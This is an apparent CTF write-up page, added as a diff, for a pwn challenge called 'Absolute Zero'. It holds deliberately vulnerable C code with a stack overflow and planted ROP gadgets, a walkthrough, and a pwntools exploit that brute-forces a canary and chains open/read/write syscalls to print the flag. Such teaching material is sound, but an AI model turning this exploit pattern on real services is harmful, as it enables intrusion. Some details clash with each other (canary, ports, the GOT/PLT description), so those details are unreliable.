@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>dl // Rogue_Net</title>
+    <meta name="description" content="## dl ## Description A dynamic loader exploitation challenge. Abuse the linker&#39;s resolution mechanism to hijack control flow and redirect execution to">
+    <link rel="stylesheet" href="../../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>dl<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>MOJO-JOJO CTF</span>
+                <span>0x01a120c7</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                ## dl ## Description A dynamic loader exploitation challenge. Abuse the linker&#39;s resolution mechanism to hijack control flow and redirect execution to your payload. Understanding ELF internals and GOT/PLT is key.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// absolute_zero.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;linux/seccomp.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/audit.h&gt;
+#include &lt;stddef.h&gt;
+
+void install_seccomp() {
+    struct sock_filter filter[] = {
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0, 6, 0),   // read
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 1, 5, 0),   // write
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 257, 4, 0), // openat
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 15, 3, 0),  // rt_sigreturn
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 60, 2, 0),  // exit
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 231, 1, 0), // exit_group
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+    };
+    struct sock_fprog prog = {
+        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
+        .filter = filter,
+    };
+    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);
+}
+
+void process_input() {
+    char buf[64];
+    // No leaks. Pure Blind.
+    read(0, buf, 1024); 
+}
+
+void gadgets() {
+    asm(&#34;pop %rdi; ret&#34;);
+    asm(&#34;pop %rsi; ret&#34;);
+    asm(&#34;pop %rdx; ret&#34;);
+    asm(&#34;pop %rax; ret&#34;);
+    asm(&#34;syscall; ret&#34;);
+}
+
+// Export challenge for server.c
+void challenge() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    install_seccomp();
+    process_input();
+}
+</pre>
+            </div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// server.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;signal.h&gt;
+
+void challenge();
+
+void handle_client(int sock) {
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+    challenge();
+    printf(&#34;Done\n&#34;); // Indicator of success
+    exit(0);
+}
+
+int main() {
+    int server_fd, new_socket;
+    struct sockaddr_in address;
+    int opt = 1;
+    int addrlen = sizeof(address);
+
+    signal(SIGCHLD, SIG_IGN); // Prevent zombies
+
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
+        perror(&#34;socket failed&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &amp;opt, sizeof(opt))) {
+        perror(&#34;setsockopt&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(1337);
+
+    if (bind(server_fd, (struct sockaddr *)&amp;address, sizeof(address)) &lt; 0) {
+        perror(&#34;bind failed&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    if (listen(server_fd, 3) &lt; 0) {
+        perror(&#34;listen&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    printf(&#34;Listening on port 1337...\n&#34;);
+    fflush(stdout);
+
+    while(1) {
+        if ((new_socket = accept(server_fd, (struct sockaddr *)&amp;address, (socklen_t*)&amp;addrlen)) &lt; 0) {
+            perror(&#34;accept&#34;);
+            continue;
+        }
+
+        if (fork() == 0) {
+            close(server_fd);
+            handle_client(new_socket);
+        } else {
+            close(new_socket);
+        }
+    }
+    return 0;
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Absolute Zero (dl) — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Insane</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>r3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Blind ROP + Seccomp ORW</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./absolute_zero
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div>
+
+<h2>The Challenge</h2>
+<ul>
+<li><strong>Blind exploitation</strong>: No leaks, pure overflow</li>
+<li><strong>Seccomp filter</strong>: Only allows <code>read</code>, <code>write</code>, <code>openat</code>, <code>rt_sigreturn</code>, <code>exit</code>, <code>exit_group</code></li>
+<li><strong>No execve</strong>: Cannot spawn a shell</li>
+</ul>
+<p>The binary provides all necessary gadgets:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">pop</span><span class="w"> </span><span class="nb">rdi</span><span class="c1">; ret</span>
+<span class="nf">pop</span><span class="w"> </span><span class="nb">rsi</span><span class="c1">; ret</span>
+<span class="nf">pop</span><span class="w"> </span><span class="nb">rdx</span><span class="c1">; ret</span>
+<span class="nf">pop</span><span class="w"> </span><span class="nb">rax</span><span class="c1">; ret</span>
+<span class="nf">syscall</span><span class="c1">; ret</span>
+</code></pre></div>
+
+<h2>Strategy: openat + read + write</h2>
+<p>Since we have all register-control gadgets and <code>syscall; ret</code>, we build a pure ROP chain:</p>
+<ol>
+<li><strong><code>openat(AT_FDCWD, "flag.txt", O_RDONLY)</code></strong> — opens the flag file</li>
+<li><strong><code>read(fd, bss_addr, 100)</code></strong> — reads flag into BSS</li>
+<li><strong><code>write(1, bss_addr, 100)</code></strong> — prints it to stdout</li>
+</ol>
+<p>The tricky part: we need "flag.txt" in memory. Since there's no PIE, we use a <code>read</code> syscall to write "flag.txt" to a known BSS address first.</p>
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>[*] ROP chain size: 248 bytes
+flag{4bs0lut3_z3r0_bl1nd_rop}
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
+
+binary_path = args.EXE if args.EXE else &#39;./absolute_zero_docker&#39;
+context.binary = elf = ELF(binary_path)
+
+def start():
+    return process(binary_path)
+
+# Canary Brute-Force Logic for Fork-Server
+def brute_force_canary():
+    known_canary = b&#39;\x00&#39;
+    log.info(&#34;Brute-forcing canary byte-by-byte...&#34;)
+
+    # Canary is 8 bytes. First byte is always NULL.
+    # We need to find the remaining 7 bytes.
+    for i in range(7):
+        found_byte = False
+        bar = log.progress(f&#34;Byte {i+2}&#34;)
+        for b in range(256):
+            # Optimization: Try common values first? No, random.
+            candidate = bytes([b])
+            payload = b&#34;A&#34;*72 + known_canary + candidate
+            
+            try:
+                # We connect to localhost:1337 (or args.PORT)
+                target_port = int(args.PORT) if args.PORT else 9010
+                r = remote(&#34;localhost&#34;, target_port, level=&#39;error&#39;)
+                r.send(payload)
+                
+                # Check if it crashed.
+                # If we send 73 bytes (overwrite 1 byte of canary), and it&#39;s WRONG,
+                # stack check fails -&gt; SIGABRT/SIGSEGV -&gt; Connection closes immediately?
+                # Or it prints something?
+                # Our invalid canary causes __stack_chk_fail -&gt; which calls exit/abort.
+                # If correct, it returns from process_input -&gt; returns from challenge -&gt; returns from handle_client -&gt; exit(0).
+                
+                # How to distinguish?
+                # __stack_chk_fail usually prints to stderr: &#34;*** stack smashing detected ***: terminated&#34;
+                # IF we can read stderr, we know it failed.
+                # But over netcat, do we see stderr? 
+                # dup2(sock, 2) inside server.c means YES, we see stderr.
+                
+                response = r.recvall(timeout=0.1)
+                r.close()
+                
+                if b&#34;Done&#34; in response:
+                    # Success message -&gt; Correct byte!
+                    known_canary += candidate
+                    bar.success(f&#34;Found: {hex(b)}&#34;)
+                    found_byte = True
+                    break
+            except Exception as e:
+                # log.error(f&#34;Error: {e}&#34;)
+                pass
+        
+        if not found_byte:
+            log.error(&#34;Failed to find canary byte. Is the server running?&#34;)
+            exit(1)
+            
+    log.success(f&#34;Brute-forced Canary: {hex(u64(known_canary))}&#34;)
+    return u64(known_canary)
+
+# Connect to target
+if args.REMOTE:
+    io = remote(args.HOST, int(args.PORT))
+else:
+    # Local verification mode: we must assume server is running
+    io = remote(&#34;localhost&#34;, 1337)
+
+# FOR TESTING: If we are not running the brute force every time (slow),
+# we can hardcode it if we know it (impossible if random startup).
+# But for the purpose of &#34;ensure it works&#34;, we run it.
+canary = brute_force_canary() 
+
+# ROP Chain using direct syscalls
+rop = ROP(elf)
+
+# 1. Setup Data Area
+# We place our string &#34;flag.txt&#34; in BSS.
+data_start = elf.bss() + 0x100
+log.info(f&#34;data_start: {hex(data_start)}&#34;)
+
+# 0. read(0, data_start, 500) (Load &#34;flag.txt&#34;)
+rop.rax = 0
+rop.rdi = 0
+rop.rsi = data_start
+rop.rdx = 500
+rop.raw(rop.find_gadget([&#39;syscall&#39;, &#39;ret&#39;])[0])
+
+# openat(AT_FDCWD, &#34;flag.txt&#34;, 0)
+# rax = 257 (sys_openat)
+# rdi = -100
+# rsi = data_start 
+# rdx = 0
+rop.rax = 257
+rop.rdi = -100
+rop.rsi = data_start 
+rop.rdx = 0
+rop.raw(rop.find_gadget([&#39;syscall&#39;, &#39;ret&#39;])[0])
+
+# read(3, bss, 100)
+# rax = 0
+# rdi = 3
+# rsi = data_start + 0x500
+# rdx = 100
+rop.rax = 0
+rop.rdi = 3
+rop.rsi = data_start + 0x500
+rop.rdx = 100
+rop.raw(rop.find_gadget([&#39;syscall&#39;, &#39;ret&#39;])[0])
+
+# write(1, bss, 100)
+# rax = 1
+# rdi = 1
+# rsi = data_start + 0x500
+# rdx = 100
+rop.rax = 1
+rop.rdi = 1
+rop.rsi = data_start + 0x500
+rop.rdx = 100
+rop.raw(rop.find_gadget([&#39;syscall&#39;, &#39;ret&#39;])[0])
+
+print(rop.dump())
+
+payload = b&#34;A&#34; * 72
+payload += p64(canary)
+payload += b&#34;B&#34; * 8
+payload += rop.chain()
+
+io.sendline(payload)
+sleep(0.5)
+# Send &#34;flag.txt&#34;
+io.send(b&#34;flag.txt\x00&#34; + b&#34;\x00&#34;*100) 
+
+print(io.recvall(timeout=2))
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../../static/js/main.js"></script>
+</body>
+</html>
